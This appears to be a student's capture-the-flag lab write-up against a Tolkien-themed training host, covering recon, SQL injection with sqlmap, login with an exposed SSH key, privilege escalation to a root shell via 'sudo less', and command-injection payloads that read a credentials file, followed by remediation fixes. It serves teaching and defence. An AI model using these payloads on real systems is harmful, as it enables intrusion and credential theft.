## Flags found:
#### - FLAG{So_It_Begins.}
#### - Flag{Keep_It_Secret_Keep_It_Safe}
#### - FLAG{All_That_Is_Gold_Does_Not_Glitter}
#### - FLAG{Mithril_Master}
#### - FLAG{Samwise_The_Brave}
#### - Flag{I_See_You}
#### - FLAG{It_Is_Done.} (root)

---

# Passive Reconnaissance: Mordor Corp

## Purpose
This document outlines passive information gathering performed against the target without active exploitation or malicious payload delivery.

## Target
`http://mordor-corp.fi`

## Key Findings

### Search Functionality
A user search feature was identified at `/search/`:
- **Method:** GET
- **Parameter:** `username`
- **Legitimate example:** `http://mordor-corp.fi/search/?username=sauron`

<img width="856" height="370" alt="image" src="https://github.com/user-attachments/assets/4ef202c2-0015-45c9-92b7-77d3b93915a3" />

### Source Code Analysis
The page source contains the template syntax `{{row["password"]}}`, indicating:
- Database fields (including passwords) are rendered directly to end users
- Python-based backend (likely Flask with Jinja2 templating)

### Correspondence Insights
Information provided by CEO Sauron revealed:
- The organization takes pride in their "top-of-the-line" user search function
- Potential presence of outdated database tables still active in the system
- System was developed years ago and lacks recent security updates
- CEO has lost access to the admin account
- Mention of "HSS or similar" (potential SSH or related service reference)

### Web Server Configuration
- **Server:** Apache/2.4.54 (Debian)
- **Missing security headers:** X-Frame-Options, Content-Security-Policy, X-Content-Type-Options, Strict-Transport-Security

The response headers reveal the Apache version and confirm the absence of all major security headers:

<img width="346" height="500" alt="1" src="https://github.com/user-attachments/assets/b2de5b55-85f4-4229-8dbe-027c14da6304" />

### Exposed Resources
A publicly accessible internal chat log was discovered at `/uploads/chat.log` containing:
- Administrator-user conversation discussing hidden development artifacts
- Suggestion to examine asset files thoroughly

<img width="713" height="386" alt="2" src="https://github.com/user-attachments/assets/58866f14-9ac8-4d92-83cb-16a954665d39" />

### Enumeration Opportunities
The chat log reference suggests potential sensitive information may reside in:
- JavaScript files
- CSS files
- Images
- Other static resources

This increases the likelihood of discovering hidden endpoints, credentials, or developer notes during further enumeration.

---

# Enumeration & Mapping

## Open Ports & Services
An Nmap scan revealed two open TCP services:

<img width="670" height="266" alt="3" src="https://github.com/user-attachments/assets/6e35657e-71a3-4e88-809c-24349fed9420" />

| Port | Service | Version |
|------|---------|---------|
| 22 | OpenSSH | 8.4p1 (Debian 11) |
| 80 | Apache HTTP Server | 2.4.54 (Debian) |

### Service Analysis
- **SSH (port 22):** Potential attack surface if weak credentials, reused passwords, exposed SSH keys, or privilege escalation vulnerabilities exist.
- **HTTP (port 80):** Hosts the Mordor Corp website — likely the primary attack surface.

### Operating System
The host runs a Linux-based OS. Nmap OS fingerprinting suggests Linux kernel versions between 4.x and 5.x.

### Exposed Services Summary
No additional common services (MySQL, FTP, SMB, HTTPS) are exposed externally, suggesting entry points are limited to:
- SSH access
- The web application

---

## Known CVEs

Based on the identified software versions, the following known vulnerabilities were researched:

| Software | Version | CVE | Description |
|----------|---------|-----|-------------|
| Apache HTTP Server | 2.4.54 | CVE-2022-37436 | HTTP response splitting via malformed headers |
| Apache HTTP Server | 2.4.54 | CVE-2022-36760 | HTTP request smuggling via mod_proxy |
| OpenSSH | 8.4p1 | CVE-2023-38408 | Remote code execution via ssh-agent forwarding |
| PHP | 7.4.33 | CVE-2022-31628 | Phar deserialization vulnerability |
| PHP | 7.4.33 | CVE-2022-31629 | HTTP header injection vulnerability |

> **Note:** While these CVEs were identified, exploitation was not necessary as more direct attack vectors (SQL injection, exposed SSH key) were available and successfully exploited.

---

## Subdomain Enumeration
A subdomain enumeration attempt was performed to identify any additional attack surfaces:

**Command:** `dirb http://mordor-corp.fi -r`

No subdomains or virtual hosts were discovered. The attack surface is limited to the single domain `mordor-corp.fi` running on the identified IP.

---

## Web Application Findings

### SQL Injection Vulnerability
The `/search` endpoint exhibits SQL injection behavior:
- Inputting `--` or `'` manipulates SQL queries without generating errors
- Indicates lack of input sanitization

**Boolean-based data leakage confirmed:**

| Payload | Users Returned |
|---------|----------------|
| `1' OR '1'='1` | saruman (saruman@mordor-corp.fi), sauron (sauron@mordor-corp.fi) |
| `%' OR '1'='1` | Same results |

<img width="857" height="420" alt="Screenshot 2026-03-31 224310" src="https://github.com/user-attachments/assets/82f526d2-f9a8-4790-ac47-55c7c65eb27d" />

> **Note:** Passwords were not disclosed in search results despite being referenced in the page template (`{{row["password"]}}`).

---

### Database Enumeration
Using `sqlmap`, the injection point was exploited to enumerate the database:

- **Backend DBMS:** MySQL >= 5.0.12
- **Databases:** `information_schema`, `mordordb`
- **Tables in `mordordb`:** `users`, `moria`

<img width="759" height="250" alt="4" src="https://github.com/user-attachments/assets/2c1887aa-d483-4513-89d0-1a0b3cc71564" />

#### `users` table contents:
| id | username | email | role | password (hash) |
|----|----------|-------|------|-----------------|
| 1 | saruman | saruman@mordor-corp.fi | user | `6ca3e14cf5ffd2108aa869f4c16394ad` (MD5) |
| 2 | sauron | sauron@mordor-corp.fi | admin | `$2y$14$SWEbY90.fjIbMTvrPHz4teoesnRaWyrO9LPB8NQijFIy4rckSmHnm` (bcrypt) |

#### `moria` table contents:
| id | flag |
|----|------|
| 1 | `FLAG{Mithril_Master}` |

---

## Additional Endpoints Discovered

<img width="419" height="172" alt="5" src="https://github.com/user-attachments/assets/265430ea-1ef7-425c-b1c3-adc5e40c7e2f" />

| Endpoint | Description |
|----------|-------------|
| `/profile` | Contains a login form (username + password fields); authentication-protected. Also vulnerable to time-based blind SQL injection. |
| `/logout` | Redirects to `/profile` instead of a homepage or dedicated login page. |
| `/upload` | File upload interface – requires admin access. |
| `/uploads` | Directory listing (exposed) containing `chat.log` and `.ssh/sauron_rsa`. |
| `/assets` | Static assets directory – contains images, CSS, JS, and a flag. |
| `/server-status` | Apache status page (leaks internal IPs, software versions, and active requests). |
| `/palantir` | Ping tool – requires admin access. Vulnerable to command injection. |

### Exposed SSH Private Key
A private SSH key was discovered at `/uploads/.ssh/sauron_rsa` — publicly accessible via direct URL, which is a critical misconfiguration that provides direct system access:

<img width="512" height="225" alt="6c" src="https://github.com/user-attachments/assets/e3e81c42-dbcd-46dc-b046-ea933fbee49f" />

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn...
-----END OPENSSH PRIVATE KEY-----
```

### Apache Server-Status Leak
The `/server-status` endpoint (accessible without authentication) revealed:
- **Software:** Apache/2.4.54, PHP/7.4.33
- **Internal IP addresses:** `172.19.0.2`, `172.19.0.1`
- **Suspicious request paths:** `/zorum`, `/zh-tw`, `/zh-cn`, `/zoom`, `/zone`, `/zope`, `/zh_TW`, `/zones`

<img width="865" height="1039" alt="7" src="https://github.com/user-attachments/assets/f9d9415f-89de-4d22-b7ae-dd70b5a5045b" />

### Assets Directory Analysis
The `/assets/` directory was recursively downloaded and examined:

- `script.js` – contained a base64-encoded flag discovered by running `atob()` in the browser console:

<img width="416" height="124" alt="8a" src="https://github.com/user-attachments/assets/41aa7a9c-c109-4858-ac75-31e3b5cdb259" />

```javascript
atob("RmxhZ3tLZWVwX0l0X1NlY3JldF9LZWVwX0l0X1NhZmV9")
// Output: Flag{Keep_It_Secret_Keep_It_Safe}
```

<img width="414" height="127" alt="8b" src="https://github.com/user-attachments/assets/05975443-107f-4d0b-8ada-6ac3c0435b63" />

- `style.css` – standard styles (no secrets)
- `Mordor.png` – contained a steganographically hidden flag discovered using an online steganography analysis tool:

<img width="1179" height="918" alt="9" src="https://github.com/user-attachments/assets/ba1e8e34-9e8d-4817-acaa-52f8bf045257" />

```
Flag{I_See_You}
```

---

## Attack Surface Summary
The following areas warrant further testing:
- SQL injection exploitation (confirmed vulnerability on both `/search` and `/profile`)
- SSH service – private key exposure enables direct access as `sauron`
- Weak authentication or credential reuse on the login page (admin hash may be crackable)
- File upload functionality at `/upload` (once admin access is obtained)
- Exposed uploads directory and leaked internal files (including SSH key)
- Hidden admin panels or virtual hosts (based on server-status requests)
- Weak session handling around `/profile` and `/logout`
- Known vulnerabilities affecting Apache 2.4.54, OpenSSH 8.4p1, and PHP 7.4.33
- Forgotten legacy functionality or old database tables (e.g., `moria`)
- Steganographic content hidden in image assets

These findings position authentication, SSH access, and the file upload functionality as critical attack surfaces for subsequent testing phases.

---

# Initial Access

## Attempt 1: SSH with Exposed Private Key
**Vulnerability tested:** Exposed SSH private key (misconfiguration)  
**Method:** Direct SSH login using the discovered key  
**Command:** `ssh -i sauron_rsa sauron@mordor-corp.fi`  
**Outcome:** ✅ **Success** – The key was not passphrase-protected and provided immediate access to the system as user `sauron`.

<img width="793" height="280" alt="11" src="https://github.com/user-attachments/assets/eead866d-4992-4b88-aa20-0b6c74a47cd5" />

## Attempt 2: Cracking Saruman's MD5 Hash
**Vulnerability tested:** Weak password hash (MD5)  
**Method:** Dictionary attack with rockyou.txt using hashcat  
**Command:** `hashcat -m 0 -a 0 saruman_hash.txt /usr/share/wordlists/rockyou.txt`  
**Outcome:** ❌ **Failed** – The hash was not present in the rockyou wordlist.

**Second attempt using teacher-provided mask hint:** `g?l?l?l?l?l?l?d?d?d7`  
**Command:** `hashcat -m 0 -a 3 saruman_hash.txt gandalf?d?d?d7 --force`  
**Outcome:** ❌ **Failed** – Process was killed due to insufficient resources in the Docker container. The mask pattern `gandalf?d?d?d7` was correct based on the teacher's hint, but hardware limitations prevented completion. SSH access was already achieved via the exposed private key, so no further cracking attempts were made.

<img width="733" height="215" alt="10" src="https://github.com/user-attachments/assets/e07de792-503c-46ec-bf83-20dc0c98b217" />

## Attempt 3: SQL Injection Bypass on `/profile/`
**Vulnerability tested:** Time-based blind SQL injection on login form  
**Method:** Attempted simple bypass payload  
**Payload:** `username=admin' OR '1'='1' -- &password=anything`  
**Outcome:** ❌ **Failed** – The form did not authenticate with this payload. Since SSH access was already achieved, no deeper exploitation was pursued.

## Summary of Initial Access
- **Successful vector:** SSH private key exposure.
- **Credentials obtained:** None needed – key-based authentication.
- **Privilege level:** `sauron` (admin role in web context, but standard user in the OS).

---

# Privilege Escalation

## Initial System Enumeration (as `sauron`)
- **OS:** Debian 11 (bullseye)
- **Kernel:** 5.10.0
- **Running processes:** Web server (Apache), MySQL, SSH.

### Sudo Rights Enumeration
After gaining SSH access as `sauron`, sudo privileges were checked:

**Command:** `sudo -l`

<img width="757" height="132" alt="12" src="https://github.com/user-attachments/assets/a3328ae8-023f-47ad-8e8d-9a934c4b421d" />

**Output:**
```
Matching Defaults entries for sauron on ff3a1b1e7b9d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User sauron may run the following commands on ff3a1b1e7b9d:
    (root) NOPASSWD: /usr/bin/less
```

`sauron` is permitted to run `/usr/bin/less` as root without a password — a known [GTFOBins](https://gtfobins.github.io/gtfobins/less/) privilege escalation vector.

---

### Escalation via `less`
**Vulnerability tested:** Misconfigured sudo rights (`NOPASSWD: /usr/bin/less`)  
**Method:** GTFOBins — reading a root-owned file directly via `less` running as root  
**Command:**
```
sudo less /root/root.txt
```

To obtain a full interactive root shell:
```
sudo less /etc/passwd
# Inside less, type:
!/bin/bash
# Press Enter — a root shell is spawned
```

**Outcome:** ✅ **Success** – Root flag read directly. Full root shell also confirmed.

### Root Flag

<img width="364" height="55" alt="18" src="https://github.com/user-attachments/assets/5b277dc6-e005-4b42-ae15-486642ca68d7" />

```
FLAG{It_Is_Done.}
```
Located at: `/root/root.txt`

---

## Post-Exploitation Enumeration

After achieving root access, a full filesystem search was performed to locate any remaining flags:

**Command:**
```
grep -r "FLAG{" / 2>/dev/null
```

<img width="726" height="130" alt="14" src="https://github.com/user-attachments/assets/5cf9a93d-d7b6-4d60-941f-d68a08bf7e9c" />

**Output:**
```
/home/samwise/user.txt:FLAG{Samwise_The_Brave}
/var/www/html/index.html:        <p style="display: none">FLAG{All_That_Is_Gold_Does_Not_Glitter}</p>
/root/root.txt:FLAG{It_Is_Done.}
```

### Flag: Samwise_The_Brave
**Location:** `/home/samwise/user.txt`  
**Flag:** `FLAG{Samwise_The_Brave}`  
**Note:** User `samwise` exists on the system but was not identified during initial enumeration — discovered only through post-exploitation grep.

### Flag: All_That_Is_Gold_Does_Not_Glitter
**Location:** `/var/www/html/index.html`  
**Flag:** `FLAG{All_That_Is_Gold_Does_Not_Glitter}`  
**Note:** Hidden in the HTML source using inline CSS `display: none` — invisible to regular visitors but present in the page source.

<img width="426" height="403" alt="15" src="https://github.com/user-attachments/assets/2a3e32b6-c2d8-4302-b0b5-74db35d4f074" />

---

## Additional Finding: Command Injection on `/palantir`

During post-exploitation, the `/palantir` endpoint was further investigated.

### Source Code Analysis
```php
$output = shell_exec("ping -c 4 " . $ip);
```

User input is passed directly to `shell_exec()` without any sanitization or validation — a classic command injection vulnerability.

**Authentication bypass:** The endpoint only checks for a `role=admin` cookie value with no server-side session validation, making it trivially bypassable via browser DevTools.

<img width="1800" height="375" alt="16" src="https://github.com/user-attachments/assets/58eda622-5aeb-46d3-990d-41e19242a19c" />

### Command Injection — Confirmed
**Method:** Appending shell commands after a valid IP using `;`

| Payload | Output |
|---------|--------|
| `127.0.0.1; ls /var/www/html` | Directory listing of web root |
| `127.0.0.1; grep -r "FLAG{" /var/www/html/` | Revealed hidden flag in `index.html` |
| `127.0.0.1; cat /var/www/html/db.php` | Leaked database credentials |

<img width="584" height="489" alt="17" src="https://github.com/user-attachments/assets/76c4b90d-1ec1-480c-9627-dfda036ff81e" />

**Leaked credentials from `db.php`:**
```php
$DB_HOST = "db";
$DB_NAME = "mordordb";
$DB_USER = "db_user";
$DB_PASS = "speak-friend-and-enter";
```

**Outcome:** ✅ **Critical** – Arbitrary command execution confirmed. Sensitive credentials exposed.

---

## Complete Flag Summary

| # | Flag | Location | Method |
|---|------|----------|--------|
| 1 | `FLAG{So_It_Begins.}` | `häxa.txt` in attacker container | Direct file read (`ls`, `cat`) |
| 2 | `Flag{Keep_It_Secret_Keep_It_Safe}` | `/assets/script.js` | Base64 decode via `atob()` |
| 3 | `FLAG{All_That_Is_Gold_Does_Not_Glitter}` | `/var/www/html/index.html` | Hidden via `display: none` — found via post-exploitation grep |
| 4 | `FLAG{Mithril_Master}` | `moria` table in `mordordb` | SQL injection via `sqlmap` |
| 5 | `FLAG{Samwise_The_Brave}` | `/home/samwise/user.txt` | Post-exploitation grep as root |
| 6 | `Flag{I_See_You}` | `/assets/Mordor.png` | Steganography — hidden image data |
| Root | `FLAG{It_Is_Done.}` | `/root/root.txt` | Privilege escalation via `sudo less` |

---

# Remediation

> ⚠️ All fixes were applied while keeping the platform fully operational. No services were shut down during the remediation process. The web application, SSH service, and database continued to function normally throughout.

## 1. SQL Injection — Critical

**Vulnerability:** The `/search` and `/profile` endpoints pass user input directly into SQL queries without sanitization, allowing full database extraction via tools such as `sqlmap`.

**Impact:** Complete access to the database including user credentials, password hashes, and sensitive flags.

**Fix:** Replace raw SQL queries with prepared statements.

Vulnerable code:
```php
$query = "SELECT * FROM users WHERE username = '$username'";
```

Secure code:
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
```

---

## 2. Exposed SSH Private Key — Critical

**Vulnerability:** The private SSH key for user `sauron` was publicly accessible at `/uploads/.ssh/sauron_rsa` via the web server.

**Impact:** Any unauthenticated user could download the key and log in directly as `sauron` via SSH without a password.

**Fix:**
```bash
# Remove the key from the web root
rm /var/www/html/uploads/.ssh/sauron_rsa

# Disable directory listing in Apache
# In /etc/apache2/apache2.conf, change:
# Options Indexes FollowSymLinks
# To:
# Options -Indexes FollowSymLinks

service apache2 reload
```

---

## 3. Command Injection on `/palantir` — Critical

**Vulnerability:** The ping tool passes user input directly to `shell_exec()` without any validation or sanitization.

**Impact:** An attacker with an admin cookie can execute arbitrary system commands, read sensitive files such as `db.php`, and achieve full server compromise.

Vulnerable code:
```php
$output = shell_exec("ping -c 4 " . $ip);
```

Secure code:
```php
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $output = shell_exec("ping -c 4 " . escapeshellarg($ip));
} else {
    $output = "Invalid IP address.";
}
```

---

## 4. Hardcoded Database Credentials — High

**Vulnerability:** `db.php` contains the database password in plaintext inside the web root. Combined with the command injection vulnerability on `/palantir`, the credentials were trivially extracted.

**Leaked password:** `speak-friend-and-enter`

**Fix:** Move sensitive credentials outside the web root and use environment variables.
```php
// Replace hardcoded values with:
$DB_PASS = getenv('DB_PASSWORD');
```

---

## 5. Misconfigured Sudo Rights — High

**Vulnerability:** User `sauron` was permitted to run `/usr/bin/less` as root without a password (`NOPASSWD`). Via GTFOBins, this allowed immediate privilege escalation to root.

**Fix:**
```bash
# Edit the sudoers file safely
visudo

# Remove or comment out the line:
# sauron ALL=(root) NOPASSWD: /usr/bin/less
```

---

## 6. Weak Password Hashing (MD5) — High

**Vulnerability:** `saruman`'s password is stored as an unsalted MD5 hash (`6ca3e14cf5ffd2108aa869f4c16394ad`). MD5 is cryptographically broken and can be cracked quickly using mask attacks.

**Impact:** Password recoverable using `hashcat` with a pattern-based mask: `gandalf?d?d?d7`.

**Fix:** Migrate all passwords to bcrypt (already used for `sauron`).
```php
// Hash a new password
$hash = password_hash($password, PASSWORD_BCRYPT);

// Verify on login
if (password_verify($input_password, $stored_hash)) {
    // Login successful
}
```

---

## 7. Exposed Sensitive Endpoints — High

**Vulnerability:** The following endpoints were accessible without authentication:
- `/server-status` — leaked internal IP addresses, Apache/PHP versions, and active requests
- `/uploads` — directory listing exposed `chat.log` and the SSH private key

**Fix:**
```apache
# Restrict server-status to localhost only
<Location /server-status>
    Require local
</Location>

# Disable directory listing globally
<Directory /var/www/html>
    Options -Indexes
</Directory>
```
```bash
service apache2 reload
```

---

## 8. Missing HTTP Security Headers — Medium

**Vulnerability:** The web server returns responses without important security headers, increasing exposure to XSS, clickjacking, and MIME-sniffing attacks.

**Missing headers:** `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security`

**Fix:**
```apache
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Strict-Transport-Security "max-age=31536000"
```
```bash
a2enconf security-headers
a2enmod headers
service apache2 reload
```

---

## 9. Steganographic Content in Public Assets — Medium

**Vulnerability:** A flag (`Flag{I_See_You}`) was hidden inside `Mordor.png` using steganography. While not directly exploitable, hiding data in public assets is a security risk as it can be used to exfiltrate sensitive information or communicate covertly.

**Fix:** Audit all public-facing static assets for hidden content before deployment using steganography detection tools.
```bash
steghide extract -sf Mordor.png -p ""
zsteg Mordor.png
binwalk Mordor.png
```

---

## Remediation Summary

| # | Vulnerability | Severity | Fix |
|---|--------------|----------|-----|
| 1 | SQL Injection | 🔴 Critical | Prepared statements |
| 2 | Exposed SSH private key | 🔴 Critical | Key removed, directory listing disabled |
| 3 | Command Injection (`/palantir`) | 🔴 Critical | Input validation + `escapeshellarg()` |
| 4 | Hardcoded database credentials | 🟠 High | Environment variables |
| 5 | Misconfigured sudo rights | 🟠 High | Sudo entry removed |
| 6 | Weak MD5 password hashing | 🟠 High | Migrate to bcrypt |
| 7 | Exposed sensitive endpoints | 🟠 High | Apache configuration updated |
| 8 | Missing HTTP security headers | 🟡 Medium | Headers added |
| 9 | Steganographic content in assets | 🟡 Medium | Asset audit + steganography scanning |

---

# References

| Resource | URL |
|----------|-----|
| GTFOBins — less | https://gtfobins.github.io/gtfobins/less/ |
| sqlmap documentation | https://sqlmap.org/ |
| CVE-2022-37436 — Apache HTTP Server | https://nvd.nist.gov/vuln/detail/CVE-2022-37436 |
| CVE-2022-36760 — Apache HTTP Server | https://nvd.nist.gov/vuln/detail/CVE-2022-36760 |
| CVE-2023-38408 — OpenSSH | https://nvd.nist.gov/vuln/detail/CVE-2023-38408 |
| CVE-2022-31628 — PHP | https://nvd.nist.gov/vuln/detail/CVE-2022-31628 |
| CVE-2022-31629 — PHP | https://nvd.nist.gov/vuln/detail/CVE-2022-31629 |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| OWASP Command Injection | https://owasp.org/www-community/attacks/Command_Injection |
| PHP password_hash documentation | https://www.php.net/manual/en/function.password-hash.php |
| Apache security headers guide | https://httpd.apache.org/docs/2.4/mod/mod_headers.html |
| Hashcat mask attack | https://hashcat.net/wiki/doku.php?id=mask_attack |
